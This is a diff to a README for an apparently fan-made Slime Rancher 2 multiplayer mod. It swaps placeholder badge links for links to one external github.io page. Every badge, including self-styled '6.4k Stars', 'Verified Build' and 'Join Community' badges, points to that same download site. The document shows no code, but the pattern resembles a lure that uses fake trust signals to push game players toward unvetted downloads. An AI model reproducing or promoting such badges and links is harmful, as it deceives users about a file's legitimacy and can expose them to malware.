@@ -21,10 +21,10 @@ This fan-made mod introduces **multiplayer functionality** to the game. Players 
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 6.4k Stars](https://img.shields.io/badge/Community-6.4k_Stars-purple?logo=github\&style=for-the-badge)](#)
-[![Co-Op Ready](https://img.shields.io/badge/Co--Op-Enabled-orange?logo=steam\&style=for-the-badge)](#)
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?logo=github\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
+[![⭐️ 6.4k Stars](https://img.shields.io/badge/Community-6.4k_Stars-purple?logo=github\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
+[![Co-Op Ready](https://img.shields.io/badge/Co--Op-Enabled-orange?logo=steam\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
 
 ---
 
@@ -135,8 +135,8 @@ A: The mod is updated alongside major game patches.
 
 The **Slime Rancher 2 Multiplayer Mod** transforms the solo farming adventure into a **shared co-op experience**. From raising slimes together to exploring vibrant biomes with friends, it’s the perfect way to enjoy Beatrix’s journey with others.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Join Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download Mod](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
+[![Join Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
+[![Download Mod](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://slime-rancher-2-multiplayer-mod.github.io/.github/)
 
 ---
